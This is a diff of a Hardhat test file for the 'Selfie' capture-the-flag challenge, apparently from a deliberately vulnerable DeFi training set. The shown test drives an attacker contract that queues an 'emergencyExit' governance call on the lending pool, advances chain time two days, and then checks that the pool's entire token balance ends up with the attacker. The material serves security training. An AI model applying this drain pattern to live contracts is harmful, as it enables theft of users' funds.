@@ -36,8 +36,8 @@ describe("[Challenge] Selfie", function () {
   });
 
   it("Exploit", async function () {
-    const drainPoolTx = this.pool.interface.encodeFunctionData("drain", [this.attackerContract.address]);
-    await this.attackerContract.attack(TOKENS_IN_POOL); // Attack with the entire pool balance
+    const drainPoolTx = this.pool.interface.encodeFunctionData("emergencyExit", [this.attackerContract.address]);
+    await this.attackerContract.attack(0, drainPoolTx);
     await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // add 2 days
     await ethers.provider.send("evm_mine"); // mine the next block
     await this.attackerContract.finalizeAttack();
@@ -47,8 +47,6 @@ describe("[Challenge] Selfie", function () {
     /** SUCCESS CONDITIONS */
     expect(await this.token.balanceOf(this.attacker.address)).to.equal(0);
     expect(await this.token.balanceOf(this.pool.address)).to.equal(0);
-    expect(await this.token.balanceOf(this.attackerContract.address)).to.equal(
-      TOKENS_IN_POOL.add(ATTACKER_INITIAL_BALANCE)
-    );
+    expect(await this.token.balanceOf(this.attackerContract.address)).to.equal(TOKENS_IN_POOL.add(ATTACKER_INITIAL_BALANCE));
   });
 });
